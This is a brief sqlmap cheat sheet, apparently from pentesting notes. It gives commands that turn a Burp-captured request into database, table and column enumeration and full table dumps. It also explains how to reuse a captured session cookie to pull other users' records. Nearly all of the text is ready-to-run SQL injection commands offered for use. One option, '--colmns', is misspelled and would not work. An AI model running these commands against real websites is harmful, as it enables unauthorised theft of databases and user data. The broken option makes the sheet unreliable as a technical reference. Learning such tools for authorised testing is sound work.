## SQLmap

For this attack you should capture the request of an input parameter with burp:

sqlmap -r <txt file from burpsuite> -D <database name> --tables

sqlmap -r <txt file from burpsuite> -D <database name> --tables --columns

sqlmap -r <txt file from burpsuite> -D <database name> --dump

sqlmap -r <txt file from burpsuite> -D <database name> --tables -T users

--------------------------------
**Lateral Movement**

On a website attack, you can use your session cookie (if you have an account) to extract information of another user from the table with sqlmap.

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" --dbs    #for Database

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* --tables #for Tables of selected Database

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --colmns #for Column names

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --dump #dump tables

-----------------------------------

